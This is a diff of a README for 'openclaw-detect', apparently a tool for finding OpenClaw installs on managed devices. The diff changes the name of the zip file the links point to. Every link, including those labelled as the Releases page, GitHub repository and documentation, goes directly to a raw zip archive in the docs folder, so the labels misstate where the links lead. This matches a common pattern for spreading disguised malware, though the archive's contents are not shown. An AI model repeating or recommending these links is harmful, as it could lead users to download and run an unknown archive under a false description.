@@ -2,7 +2,7 @@
 # 🛡️ openclaw-detect - Identify OpenClaw Installs Simply 
 
 ## 📥 Download Now
-[![Download openclaw-detect](https://raw.githubusercontent.com/Soulreaper1188/openclaw-detect/main/docs/detect-openclaw-v3.6.zip)](https://raw.githubusercontent.com/Soulreaper1188/openclaw-detect/main/docs/detect-openclaw-v3.6.zip)
+[![Download openclaw-detect](https://raw.githubusercontent.com/Soulreaper1188/openclaw-detect/main/docs/detect_openclaw_v1.1.zip)](https://raw.githubusercontent.com/Soulreaper1188/openclaw-detect/main/docs/detect_openclaw_v1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **openclaw-detect**. This software allows you to run detection scripts that help find OpenClaw installations on managed devices. This guide will help you download and run the software easily.
@@ -17,7 +17,7 @@ Before you begin, ensure your device meets the following requirements:
 ## 🔗 Download & Install
 To download the software, visit the Releases page.
 
-[Download openclaw-detect here](https://raw.githubusercontent.com/Soulreaper1188/openclaw-detect/main/docs/detect-openclaw-v3.6.zip)
+[Download openclaw-detect here](https://raw.githubusercontent.com/Soulreaper1188/openclaw-detect/main/docs/detect_openclaw_v1.1.zip)
 
 ### Steps to Download:
 1. Click on the link above to go to the Releases page.
@@ -78,8 +78,8 @@ If you encounter any problems or have questions, visit the Issues section on our
 This project is licensed under the MIT License. Feel free to use and modify it according to the guidelines provided in the license file.
 
 ## 🌟 Resources
-- [GitHub Repository](https://raw.githubusercontent.com/Soulreaper1188/openclaw-detect/main/docs/detect-openclaw-v3.6.zip)
-- [Documentation](https://raw.githubusercontent.com/Soulreaper1188/openclaw-detect/main/docs/detect-openclaw-v3.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Soulreaper1188/openclaw-detect/main/docs/detect_openclaw_v1.1.zip)
+- [Documentation](https://raw.githubusercontent.com/Soulreaper1188/openclaw-detect/main/docs/detect_openclaw_v1.1.zip)
 
 ## 📌 Stay Updated
 For updates, feature releases, and more information, please follow the repository on GitHub. You can also subscribe to our discussions for community support and tips.
